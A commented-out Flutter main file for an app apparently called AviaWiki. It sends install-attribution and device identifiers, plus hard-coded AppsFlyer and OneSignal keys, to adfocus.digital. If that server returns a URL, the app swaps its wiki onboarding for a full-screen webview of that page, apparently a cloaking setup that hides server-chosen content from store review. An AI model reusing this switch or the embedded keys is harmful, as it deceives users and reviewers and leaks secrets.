// import 'dart:async';
// import 'package:android_play_install_referrer/android_play_install_referrer.dart';
// import 'package:appsflyer_sdk/appsflyer_sdk.dart';
// import 'package:avia/firebase_options.dart';
// import 'package:avia/game_screen.dart';
// import 'package:dio/dio.dart';
// import 'package:firebase_core/firebase_core.dart';
// import 'package:firebase_instance_id/firebase_instance_id.dart';
// import 'package:flutter/material.dart';
// import 'package:flutter_inappwebview/flutter_inappwebview.dart';
// import 'package:onesignal_flutter/onesignal_flutter.dart';
// import 'package:shared_preferences/shared_preferences.dart';
// import 'package:http/http.dart' as http;

// final String onesignalAppId = "d59019a6-1a64-41b3-ae1d-46a9c638cbd9";

// void main() async {
//   WidgetsFlutterBinding.ensureInitialized();
//   OneSignal.initialize(onesignalAppId);
//   await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
//   final prefs = await SharedPreferences.getInstance();
//   final bool showOnboarding = prefs.getBool('showOnboarding') ?? true;
//   await OneSignal.Notifications.requestPermission(true);
//   runApp(MyApp(showOnboarding: showOnboarding));
// }

// var instanceId;

// class MyApp extends StatefulWidget {
//   final bool showOnboarding;
//   const MyApp({Key? key, required this.showOnboarding}) : super(key: key);

//   @override
//   State<MyApp> createState() => _MyAppState();
// }

// class _MyAppState extends State<MyApp> {
//   final String appsFlyerDevKey = "2tqq6cfzvNG8qw2fS3rjdm";
//   final String serverUrl = "https://adfocus.digital/aviawiki-tech";
//   final dio = Dio();
//   AppsflyerSdk? _appsFlyerSdk;
//   final _dataCompleter = Completer<Map<String, dynamic>>();
//   @override
//   void initState() {
//     super.initState();
//     _initializeAll();
//   }

//   Future<void> _initializeAll() async {
//     final prefs = await SharedPreferences.getInstance();
//     final storedUrl = prefs.getString('url_answer');

//     if (storedUrl != null) {
//       _dataCompleter.complete({
//         'storedUrl': storedUrl,
//       });
//       return;
//     }

//     await _initializeAppsFlyer();
//     final referrerData = await _getInstallReferrer();
//     instanceId =
//         await FirebaseInstanceId.appInstanceId ?? 'Unknown installation id';

//     _appsFlyerSdk?.onInstallConversionData((response) {
//       if (!_dataCompleter.isCompleted) {
//         if (response != null && response['payload'] != null) {
//           final payload = response['payload'] as Map<String, dynamic>;
//           Map<String, dynamic> data = {};
//           payload.forEach((key, value) {
//             if (value != null) {
//               data[key] = value;
//             }
//           });

//           if (data.isNotEmpty) {
//             _dataCompleter.complete({
//               ...referrerData,
//               ...data,
//             });
//           } else {
//             _dataCompleter.complete({
//               ...referrerData,
//               'appsFlyerData': 'No Data',
//             });
//           }
//         } else {
//           _dataCompleter.complete({
//             ...referrerData,
//             'appsFlyerData': 'No Data',
//           });
//         }
//       }
//     });
//   }

//   Future<void> _initializeAppsFlyer() async {
//     final appsFlyerOptions = AppsFlyerOptions(
//       afDevKey: appsFlyerDevKey,
//       timeToWaitForATTUserAuthorization: 15,
//       showDebug: false,
//     );

//     _appsFlyerSdk = AppsflyerSdk(appsFlyerOptions);

//     try {
//       final result = await _appsFlyerSdk?.initSdk(
//         registerConversionDataCallback: true,
//         registerOnAppOpenAttributionCallback: true,
//         registerOnDeepLinkingCallback: true,
//       );
//       print("AppsFlyer initialization result: $result");

//       _appsFlyerSdk?.onInstallConversionData((res) {
//         print("Installation res: $res");
//       });
//     } catch (e) {
//       print("AppsFlyer initialization error: $e");
//     }
//   }

//   Future<Map<String, dynamic>> _getInstallReferrer() async {
//     try {
//       final referrerDetails = await AndroidPlayInstallReferrer.installReferrer;
//       return {
//         'installReferrer': referrerDetails.installReferrer ?? '',
//         'referrerClickTimestampSeconds':
//             referrerDetails.referrerClickTimestampSeconds.toString(),
//         'installBeginTimestampSeconds':
//             referrerDetails.installBeginTimestampSeconds.toString(),
//         'referrerClickTimestampServerSeconds':
//             referrerDetails.referrerClickTimestampServerSeconds.toString(),
//         'installBeginTimestampServerSeconds':
//             referrerDetails.installBeginTimestampServerSeconds.toString(),
//         'installVersion': referrerDetails.installVersion ?? '',
//         'googlePlayInstantParam':
//             referrerDetails.googlePlayInstantParam.toString(),
//       };
//     } catch (e) {
//       return {'installReferrerInfo': 'No data'};
//     }
//   }

//   Future<String?> _initializeAndFetchData(Map<String, dynamic> data) async {
//     try {
//       if (data.containsKey('storedUrl')) {
//         return data['storedUrl'];
//       }

//       final prefs = await SharedPreferences.getInstance();
//       String? externalId = prefs.getString('external_id');

//       if (externalId == null) {
//         externalId = DateTime.now().millisecondsSinceEpoch.toString();
//         await prefs.setString('external_id', externalId);
//       }
//       OneSignal.login(externalId);
//       final appsFlyerUID = await _appsFlyerSdk?.getAppsFlyerUID() ?? '';

//       final requestData = {
//         "app_id": "com.eggconcentration",
//         "app_name": "EggConcereAndroid",
//         "package_id": "com.eggconcentration",
//         "appsflyer_id": appsFlyerUID,
//         "dev_key": appsFlyerDevKey,
//         "app_instance_id": instanceId,
//         "onesignal_app_id": onesignalAppId,
//         "onesignal_external_id": externalId,
//         "platform": "android",
//         ...data,
//       };

//       final response = await dio.post(
//         serverUrl,
//         data: requestData,
//         options: Options(headers: {"Content-Type": "application/json"}),
//       );

//       if (response.statusCode == 200) {
//         final status = response.data['status'];
//         if (status != null && status.toString().isNotEmpty) {
//           try {
//             final statusResponse = await http.get(Uri.parse(status));
//             if (statusResponse.statusCode == 404) return null;

//             await prefs.setString('url_answer', status);
//             return status;
//           } catch (e) {
//             print('Error checking status: $e');
//             return null;
//           }
//         }
//       }
//       return null;
//     } catch (e) {
//       print("Data fetch error: $e");
//       return null;
//     }
//   }

//   @override
//   Widget build(BuildContext context) {
//     return MaterialApp(
//       debugShowCheckedModeBanner: false,
//       theme: ThemeData(
//         primarySwatch: Colors.orange,
//         scaffoldBackgroundColor: Colors.black,
//         appBarTheme: const AppBarTheme(
//           backgroundColor: Colors.black,
//           foregroundColor: Colors.white,
//         ),
//         colorScheme: ColorScheme.dark(
//           primary: Colors.orange,
//           secondary: Colors.orange,
//           background: Colors.black,
//         ),
//       ),
//       home: Scaffold(
//         body: FutureBuilder<Map<String, dynamic>>(
//             future: _dataCompleter.future,
//             builder: (context, dataSnapshot) {
//               if (!dataSnapshot.hasData) {
//                 return LoadingScreen();
//               }

//               return FutureBuilder<String?>(
//                 future: _initializeAndFetchData(dataSnapshot.data!),
//                 builder: (context, urlSnapshot) {
//                   if (urlSnapshot.connectionState == ConnectionState.waiting) {
//                     return LoadingScreen();
//                   } else if (urlSnapshot.hasData && urlSnapshot.data != null) {
//                     return SafeArea(
//                       bottom: false,
//                       child: InAppWebView(
//                         initialUrlRequest: URLRequest(
//                           url: WebUri(urlSnapshot.data!),
//                         ),
//                         onWebViewCreated:
//                             (InAppWebViewController controller) {},
//                         onLoadStart: (controller, url) {},
//                         onLoadStop: (controller, url) {},
//                         onProgressChanged: (controller, progress) {},
//                       ),
//                     );
//                   } else {
//                     return OnboardingScreen();
//                   }
//                 },
//               );
//             }),
//       ),
//     );
//   }
// }

// class OnboardingScreen extends StatefulWidget {
//   @override
//   _OnboardingScreenState createState() => _OnboardingScreenState();
// }

// class _OnboardingScreenState extends State<OnboardingScreen> {
//   final PageController _pageController = PageController();
//   int _currentPage = 0;
//   final int _totalPages = 3;

//   Future<void> _completeOnboarding() async {
//     final prefs = await SharedPreferences.getInstance();
//     await prefs.setBool('showOnboarding', false);
//   }

//   @override
//   Widget build(BuildContext context) {
//     return Scaffold(
//       body: Stack(
//         children: [
//           PageView(
//             controller: _pageController,
//             onPageChanged: (int page) {
//               setState(() {
//                 _currentPage = page;
//               });
//             },
//             children: List.generate(
//               _totalPages,
//               (index) => Container(
//                 decoration: BoxDecoration(
//                   image: DecorationImage(
//                     image: AssetImage('assets/onb/${index + 1}.png'),
//                     fit: BoxFit.cover,
//                   ),
//                 ),
//               ),
//             ),
//           ),
//           Positioned(
//             bottom: 40,
//             left: 0,
//             right: 0,
//             child: Center(
//               child: ElevatedButton(
//                 onPressed: () async {
//                   if (_currentPage < _totalPages - 1) {
//                     _pageController.nextPage(
//                       duration: Duration(milliseconds: 300),
//                       curve: Curves.easeInOut,
//                     );
//                   } else {
//                     await _completeOnboarding();
//                     Navigator.pushReplacement(
//                       context,
//                       MaterialPageRoute(builder: (context) => HomeScreen()),
//                     );
//                   }
//                 },
//                 style: ElevatedButton.styleFrom(
//                   backgroundColor: Colors.red,
//                   padding: EdgeInsets.symmetric(horizontal: 40, vertical: 15),
//                   shape: RoundedRectangleBorder(
//                     borderRadius: BorderRadius.circular(30),
//                   ),
//                 ),
//                 child: Text(
//                   _currentPage == _totalPages - 1 ? 'Enter AviaWiki' : 'Next',
//                   style: TextStyle(
//                     fontSize: 16,
//                     fontWeight: FontWeight.bold,
//                   ),
//                 ),
//               ),
//             ),
//           ),
//         ],
//       ),
//     );
//   }
// }

// class LoadingScreen extends StatelessWidget {
//   const LoadingScreen({super.key});

//   @override
//   Widget build(BuildContext context) {
//     return Scaffold(
//       body: Center(
//         child: Image.asset(
//           'assets/loading.png',
//           fit: BoxFit.cover,
//           width: double.infinity,
//           height: double.infinity,
//         ),
//       ),
//     );
//   }
// }
